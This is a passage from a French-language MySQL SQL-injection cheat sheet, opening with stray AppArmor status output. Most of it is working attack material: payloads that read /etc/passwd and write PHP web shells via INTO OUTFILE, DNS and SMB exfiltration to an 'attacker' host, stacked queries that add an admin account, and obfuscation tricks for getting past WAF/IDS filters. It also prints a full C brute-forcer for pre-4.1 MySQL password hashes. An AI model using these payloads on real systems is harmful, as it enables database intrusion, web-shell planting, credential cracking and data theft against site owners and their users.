0 profiles are in complain mode.
1 processes have profiles defined.
1 processes are in enforce mode.
/sbin/dhclient (592)
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
**Remarques :**

- La création de la bibliothèque nécessite des droits root pour la placer dans le répertoire des bibliothèques UDF de MySQL sous un environnement Linux.
- Sous Windows, il s’avère plus simple de déployer la bibliothèque au vu des droits du système moins drastique.
- Les assaillants attaquent des serveurs MySQL en pré-compilant les bibliothèques puis en les créant à la volée sur le système cible via leur représentation hexadécimale ; directement dans des SQL injections. Voir le paragraphe « Ecriture de fichier sur le serveur » de ce même dossier.
- Le flag gcc -m64 peut être nécessaire pour compiler la bibliothèque pour des serveurs 64 bits.

## Lecture de fichier du serveur

Les fichiers locaux du système peuvent être lus au travers de MySQL si l’utilisateur dispose du privilège « FILE ».

- LOAD_FILE()

**Exemples :**
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2F6574632F706173737764);
**Remarques :**

- Les fichiers sont nécessairement sur le serveur.
- Le répertoire de base pour la fonction LOAD_FILE() est @@datadir
- Le fichier doit disposer des droits de lecture par l’utilisateur  MySQL
- La taille du fichier lu doit être inférieure à max_allowed_packet
- La valeur par défaut de @@max_allowed_packet vaut 1047552 octets.

## Écriture de fichier sur le serveur

Des fichiers peuvent être créés sur le serveur seulement si l’utilisateur dispose du privilège « FILE ».

- INTO OUTFILE/DUMPFILE

**Exemples :**
SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';

SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'

**Remarques :**

- Les fichiers déjà existants ne peuvent être réécris avec INTO OUTFILE
- INTO OUTFILE doit être la dernière instruction de la requête
- Il n’y a pas de méthode connue pour encoder le chemin d’accès au fichier, ainsi les quotes sont nécessaires.
- Le répertoire de destination du fichier à créer doit disposer des droits nécessaires pour la création d’un fichier par l’utilisateur de MySQL.

## Requêtes distantes

### Requêtes DNS externes

SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.bar.com\\'));

### Requêtes Samba

' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt

## Requêtes empilées

Les requêtes multiples et empilées sont disponibles sous MySQL. Cela dépend du driver utilisé pour communiquer avec la base de données.

PDO_MYSQL supporte les requêtes empilées ainsi que MySQLi via la fonction multi_query().

**Exemples :**

SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, right) VALUES ('myLogin', 'myPassword','admin');

SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;

## Requêtes multi-versions

MySQL permet de réaliser des requêtes uniques destinées à différentes versions de la base de données.

**Exemples :**
UNION SELECT /*!60000 6,*//*!50000 5,*//*!40000 4,*//*!30000 3,*/0; --
SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
SELECT /*!32302 1/0, */ 1 FROM tablename
**Remarques :**

- Le premier exemple retourne toutes les versions inférieures ou égale à l’actuelle.
- Le second exemple démontre la possibilité de bypasser certains WAF/IDS
- Le troisième exemple affiche une erreur de division par 0 si MySQL > 3.23.03
- Ce mécanisme permet de connaitre la version MySQL de manière aveugle.

## Obscurcissement de requêtes

### Caractères intermédiaires de séparation

Le tableau suivant décrit les caractères hexadécimaux utilisables comme un espace blanc.

|     |     |
| --- | --- |
| 09  | Tabulation horizontale |
| 0A  | Nouvelle ligne |
| 0B  | Tabulation verticale |
| 0C  | Nouvelle page |
| 0D  | Retour chariot |
| A0  | Fin de ligne (*Line Feed*) |
| 20  | Espace |

**Exemples :**
'%0A%09UNION%0CSELECT%A0NULL%20%23
Les parenthèses peuvent également servir de séparateur.

|     |     |
| --- | --- |
| 28  | (   |
| 29  | )   |

**Exemples :**
UNION(SELECT(myColumn)FROM(myTable))

### Caractères intermédiaires pour AND/OR

|     |     |
| --- | --- |
| 20  | Space |
| 2B  | +   |
| 2D  | –   |
| 7E  | ~   |
| 21  | !   |
| 40  | @   |

**Exemples :**
SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))

### Obscurcissement via les commentaires

Les commentaires permettent également de déstructurer la requête, avec pour objectif de bypasser les WAF/IDS. L’utilisation du caractère de nouvelle ligne permet cela.

**Exemples :**
1'#
AND 0--
UNION# I am a comment!
SELECT@tmp:=table_name x FROM--
`information_schema`.tables LIMIT 1#
Version avec URLEncode :

1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23

Les fonctions peuvent également être obscurcies :
VERSION/**/%A0 (/*comment*/)

### Encodage

Le transcodage permet de bypasser certains WAF/IDS.

#### URL Encoding :

SELECT %74able_%6eame FROM information_schema.tables;

#### Double URL Encoding :

SELECT %2574able_%256eame FROM information_schema.tables;

#### Unicode Encoding :

SELECT %u0074able_%u6eame FROM information_schema.tables;

#### Invalid hex Encoding (ASP only) :

SELECT %tab%le_%na%me FROM information_schema.tables;

### Éviter les mots clés

Certains WAF/IDS se fondent sur une liste noire de mots-clés à blacklister. Il est possible d’outre-passer ces limitations via certaines syntaxes.

**Exemple :**
information_schema.tables

|     |     |
| --- | --- |
| Spaces | information_schema . tables |
| Backticks | `information_schema`.`tables` |
| Specific Code | /*!information_schema.tables*/ |
| Alternative Names | information_schema.partitions<br>information_schema.statistics<br>information_schema.key_column_usage<br>information_schema.table_constraints |

**Remarques :**

- Les noms alternatifs dépendent de la clé primaire présente dans la table.

### Transcodage de chaînes de caractères

Avec pour objectif de sauter certaines expressions régulières de détection des WAF/IDS.

- _charset’my string’

**Exemples :**
_utf8'my string'
_latin1'my string'
N'my string in unicode'

## Opérateurs

|     |     |
| --- | --- |
| [AND , &&](http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_and) | Logical AND |
| [=](http://dev.mysql.com/doc/refman/5.6/en/assignment-operators.html#operator_assign-equal) | Assign a value (as part of a [SET ](http://dev.mysql.com/doc/refman/5.6/en/set-statement.html)statement, or as part of the SET clause in an [UPDATE ](http://dev.mysql.com/doc/refman/5.6/en/update.html)statement) |
| [:=](http://dev.mysql.com/doc/refman/5.6/en/assignment-operators.html#operator_assign-value) | Assign a value |
| [BETWEEN … AND …](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_between) | Check whether a value is within a range of values |
| [BINARY](http://dev.mysql.com/doc/refman/5.6/en/cast-functions.html#operator_binary) | Cast a string to a binary string |
| [&](http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-and) | Bitwise AND |
| [~](http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-invert) | Invert bits |
| [\|](http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-or) | Bitwise OR |
| [^](http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_bitwise-xor) | Bitwise XOR |
| [CASE](http://dev.mysql.com/doc/refman/5.6/en/control-flow-functions.html#operator_case) | Case operator |
| [DIV](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_div) | Integer division |
| [/](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_divide) | Division operator |
| [<=>](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_equal-to) | NULL-safe equal to operator |
| [=](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_equal) | Equal operator |
| [>=](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_greater-than-or-equal) | Greater than or equal operator |
| [>](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_greater-than) | Greater than operator |
| [IS NOT NULL](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is-not-null) | NOT NULL value test |
| [IS NOT](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is-not) | Test a value against a boolean |
| [IS NULL](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is-null) | NULL value test |
| [IS](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_is) | Test a value against a boolean |
| [<<](http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_left-shift) | Left shift |
| [<=](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_less-than-or-equal) | Less than or equal operator |
| [<](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_less-than) | Less than operator |
| [LIKE](http://dev.mysql.com/doc/refman/5.6/en/string-comparison-functions.html#operator_like) | Simple pattern matching |
| [–](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_minus) | Minus operator |
| [% or MOD](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_mod) | Modulo operator |
| [NOT BETWEEN … AND …](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_not-between) | Check whether a value is not within a range of values |
| [!= , <>](http://dev.mysql.com/doc/refman/5.6/en/comparison-operators.html#operator_not-equal) | Not equal operator |
| [NOT LIKE](http://dev.mysql.com/doc/refman/5.6/en/string-comparison-functions.html#operator_not-like) | Negation of simple pattern matching |
| [NOT REGEXP](http://dev.mysql.com/doc/refman/5.6/en/regexp.html#operator_not-regexp) | Negation of REGEXP |
| [NOT , !](http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_not) | Negates value |
| [\|\| , OR](http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_or) | Logical OR |
| [+](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_plus) | Addition operator |
| [REGEXP](http://dev.mysql.com/doc/refman/5.6/en/regexp.html#operator_regexp) | Pattern matching using regular expressions |
| [>>](http://dev.mysql.com/doc/refman/5.6/en/bit-functions.html#operator_right-shift) | Right shift |
| [RLIKE](http://dev.mysql.com/doc/refman/5.6/en/regexp.html#operator_regexp) | Synonym for REGEXP |
| [SOUNDS LIKE](http://dev.mysql.com/doc/refman/5.6/en/string-functions.html#operator_sounds-like) | Compare sounds |
| [*](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_times) | Multiplication operator |
| [–](http://dev.mysql.com/doc/refman/5.6/en/arithmetic-functions.html#operator_unary-minus) | Change the sign of the argument |
| [XOR](http://dev.mysql.com/doc/refman/5.6/en/logical-operators.html#operator_xor) | Logical XOR |

## Constantes

|     |     |
| --- | --- |
| current_user | L’utilisateur MySQL courant, insensible à la casse |
| null, \N | Le caractère null, écrit en toutes lettres est insensible à la casse, contrairement à sa forme réduire « \N ». |
| true, false | Booléen insensibles à la casse. |

## Optimisation des requêtes

- L’optimisation de la taille des injections (en termes de chaînes de caractères).
- L’optimisation du nombre de requête (trafic réseau) pour la récupération de données, très convoité pour le mode aveugle (BSQLi).
- L’augmentation de l’information retournée par les requêtes (une BSQLi n’a que 2 états, l’idée est d’augmenter ces états).

**Les intérêts :**

- Camoufler au maximum l’intrusion
- Récupérer de plus large quantité d’information
- Gagner en temps d’exécution

**Le choix des fonctions :**

Privilégier les fonctions et alias de petite taille pour des traitements équivalents :

- SUSTRING()
- SUBSTR()
- MID()

Utiliser des comparaisons par hash plutôt qu’avec des longues chaînes de caractères :

SELECT passwd FROM Users WHERE mail='a.very.long.known.mail.address@a.very.long.domain.name.and.his.extension.com';

SELECT passwd FROM Users WHERE CRC32(mail)='1946508822';
**L’utilisation d’opérateur :**

- AND 1=1 => &&1 => &1
- OR 1=1 => ||1 => |1 (erreur pour NULL|1)
- id=0 => !id
- > plutôt que <= et vice-versa

**L’optimisation des injections en aveugle (BSQLi) :**

- Utilisation d’algorithmes de recherche dichotomique (O(log(n)).
- Favoriser la recherche par expressions régulières.
- Exploiter les chaînes de Markov pour la prédiction des caractères à chercher.
- Processus de recherche arborescent.
- SQL injections aveugles colorés.

**Références et outils :**

- [Blind Sql Injection with Regular Expressions Attack](http://www.ihteam.net/papers/blind-sqli-regexp-attack.pdf)
- [SQL Injection optimization (LNLJ-Harder_Better_Faster_Stronger_V1.0)](http://sebug.net/paper/Meeting-Documents/Ruxcon2011/LNLJ-Harder_Better_Faster_Stronger_V1.0.pdf)
- [MySQL colour blind injection](https://github.com/lukejahnke/MySQL-Colour-Blind-Injection)

## Mots de passe

### Hachage

La fonction de hachage des mots de passe a évolué à partir de la version 4.1 de MySQL.

#### MySQL < 4.1.1

L’algorithme employé est connu sous le nom de MYSQL323. Les hashs sont de 16 octets :

**Exemples :**

SELECT PASSWORD('asafety'); -- MySQL < 4.1.1 SELECT OLD_PASSWORD('asafety'); -- MySQL >= 4.1.1

**Résultats :**
4373db177264183f
**Algorithme de génération en PHP :**
<?php
function mysql323($input){
$nr = 1345345333; $add = 7; $nr2 = 0x12345671; $tmp = null;
$inlen = strlen($input);
for ($i = 0; $i < $inlen; $i++) {
$byte = substr($input, $i, 1);
if ($byte == ' ' || $byte == "\t") continue;
$tmp = ord($byte);
$nr ^= ((($nr & 63) + $add) * $tmp) + (($nr << 8) & 0xFFFFFFFF);
$nr2 += (($nr2 << 8) & 0xFFFFFFFF) ^ $nr;
$add += $tmp;
}
$out_a = $nr & ((1 << 31) - 1);
$out_b = $nr2 & ((1 << 31) - 1);
$output = sprintf("%08x%08x", $out_a, $out_b);
return $output;
}
echo mysql323("asafety");
?>

- [Implémentation de l’algorithme en PHP](http://stackoverflow.com/questions/260236/mysql-hashing-function-implementation)
- [Implémentation de l’algorithme en Python](http://djangosnippets.org/snippets/1508/)

#### MySQL >= 4.1

Hash de 40 octets préfixés d’une astérisque. L’algorithme employé est un double hachage SHA1 du mot de passe en clair. Cet algorithme est connu sous le nom de MYSQLSHA1 ou Hash MYSQL5.

**Exemples :**
SELECT PASSWORD('asafety');
SELECT CONCAT('*',UPPER(SHA1(UNHEX(SHA1('asafety')))));
**Résultats :**
*9DCFC78ACC470A60569B2FF35D89CC88DCB85E4C
*9DCFC78ACC470A60569B2FF35D89CC88DCB85E4C
**Remarques :**

- Une rétro-compatibilité est toujours présente dans les versions de MySQL >= 4.1, via la fonction OLD_PASSWORD().

### Cassage

Différentes solutions permettent de tester la résistance des mots de passe MySQL pour tous types de versions.

- Cain & Abel permet de tester les hash de MySQL 3.x à 6.x.
- Un module Metasploit pour John The Ripper est également disponible [ici](http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast).

L’algorithme de brute-force des hashs des versions MySQL < 4.1 en C est le suivant :

/* This program is public domain. Share and enjoy.
*
* Example:
* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
* $ MySQLfast 6294b50f67eda209
* Hash: 6294b50f67eda209
* Trying length 3
* Trying length 4
* Found pass: barf
*
* The MySQL password hash function could be strengthened considerably
* by:
* - making two passes over the password
* - using a bitwise rotate instead of a left shift
* - causing more arithmetic overflows
*/
#include typedef unsigned long u32;
/* Allowable characters in password; 33-126 is printable ascii */
#define MIN_CHAR 33
#define MAX_CHAR 126
/* Maximum length of password */
#define MAX_LEN 12
#define MASK 0x7fffffffL
int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
{
int i, c;
u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
u32 newstate1, newstate2, newstate3;
u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
i = -1;
sum = 7;
state1_ary[0] = 1345345333L;
state2_ary[0] = 0x12345671L;
while (1) {
while (i < stop) {
i++;
pass_ary[i] = MIN_CHAR;
step_ary[i] = (state1_ary[i] & 0x3f) + sum;
xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
sum += MIN_CHAR;
state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
state2_ary[i+1] = state2_ary[i]
+ ((state2_ary[i] << 8) ^ state1_ary[i+1]);
}
state1 = state1_ary[i+1];
state2 = state2_ary[i+1];
step = (state1 & 0x3f) + sum;
xor1 = step*MIN_CHAR + (state1 << 8);
xor2 = (state2 << 8) ^ state1;
for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
newstate2 = state2 + (xor1 ^ xor2);
newstate1 = state1 ^ xor1;
newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
div = (newstate1 & 0x3f) + sum + c;
diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
if (diff % div != 0) continue;
d = diff / div;
if (d < MIN_CHAR || d > MAX_CHAR) continue;
div = (newstate3 & 0x3f) + sum + c + d;
diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
if (diff % div != 0) continue;
e = diff / div;
if (e < MIN_CHAR || e > MAX_CHAR) continue;
pass_ary[i+1] = c;
pass_ary[i+2] = d;
pass_ary[i+3] = e;
return 1;
}
while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
sum -= MAX_CHAR;
i--;
}
if (i < 0) break;
pass_ary[i]++;
xor_ary[i] += step_ary[i];
sum++;
state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
state2_ary[i+1] = state2_ary[i]
+ ((state2_ary[i] << 8) ^ state1_ary[i+1]);
}
return 0;
}
void crack(char *hash)
{
int i, len;
u32 targ1, targ2, targ3;
int pass[MAX_LEN];
if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
printf("Invalid password hash: %s\n", hash);
return;
}
printf("Hash: %08lx%08lx\n", targ1, targ2);
targ3 = targ2 - targ1;
targ3 = targ2 - ((targ3 << 8) ^ targ1);
targ3 = targ2 - ((targ3 << 8) ^ targ1);
targ3 = targ2 - ((targ3 << 8) ^ targ1);
for (len = 3; len <= MAX_LEN; len++) {
printf("Trying length %d\n", len);
if ( crack0(len-4, targ1, targ3, pass) ) {
printf("Found pass: ");

for (i = 0; i < len; i++) putchar(pass[i]); putchar('\n'); break; } } if (len > MAX_LEN)

printf("Pass not found\n");
}
int main(int argc, char *argv[])
{
int i;
if (argc <= 1)
printf("usage: %s hash\n", argv[0]);
for (i = 1; i < argc; i++)
crack(argv[i]);
return 0;
}

## Sources & ressources

- [New Techniques in SQLi Obfuscation: SQL never before used in SQLi, Nick Galbreath, director of engineering at Etsy – DEFCON20](http://www.client9.com/2012/07/27/new-techniques-in-sql-obfuscation/)
- [Double query based SQL injection (error-based)](http://kaoticcreations.blogspot.fr/p/double-query-based-sql-injection.html)
- [The Knowledge database of websec by Roberto Salgado](http://websec.ca/kb/sql_injection)
- [Blind Sql Injection with Regular Expressions Attack](http://www.ihteam.net/papers/blind-sqli-regexp-attack.pdf)
- [SQL Injection optimization (LNLJ-Harder_Better_Faster_Stronger_V1.0)](http://sebug.net/paper/Meeting-Documents/Ruxcon2011/LNLJ-Harder_Better_Faster_Stronger_V1.0.pdf)
- [New SQL Injection Concept (Comments, 9e999, MySQL Specific) – Securiteam](http://www.securiteam.com/securityreviews/5KP0N1PC1W.html)
- [SQL Injection CHeat Sheet – Ferruh Mavituna](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/)
- [MySQL SQL Injection Cheat Sheet – PentestMonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Hashing algorithm MySQL password – PalominoDB](http://palominodb.com/blog/2011/12/04/hashing-algorithm-mysql-password)
- [Command execution with a MySQL UDF – Bernardo Damele](http://bernardodamele.blogspot.fr/2009/01/command-execution-with-mysql-udf.html)
- [MySQL UDF and AppArmor – Bernardo Damele](http://bernardodamele.blogspot.fr/2009/01/mysql-udf-and-apparmor.html)